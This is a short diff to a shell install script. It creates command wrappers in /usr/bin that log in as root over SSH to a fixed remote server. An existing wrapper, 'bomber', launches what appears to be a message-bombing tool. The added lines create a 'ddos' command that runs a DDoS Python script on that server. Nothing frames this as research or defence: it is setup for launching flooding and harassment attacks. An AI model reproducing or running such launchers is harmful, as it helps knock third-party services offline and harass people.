@@ -16,3 +16,8 @@ sudo chmod +x /usr/bin/tgk
 touch /usr/bin/bomber
 echo "ssh -t root@88.99.163.122 -p 50400 sudo /opt/infinite-bomber-reborn/builds/linux/Infinite-Bomber-x64/infinite-bomber">/usr/bin/bomber
 chmod +x /usr/bin/bomber
+
+#run ddos
+touch /usr/bin/ddos
+echo "ssh -t root@88.99.163.122 -p 50400 python /opt/custom/ddos/ddos$1.py">/usr/bin/ddos
+chmod +x /usr/bin/ddos
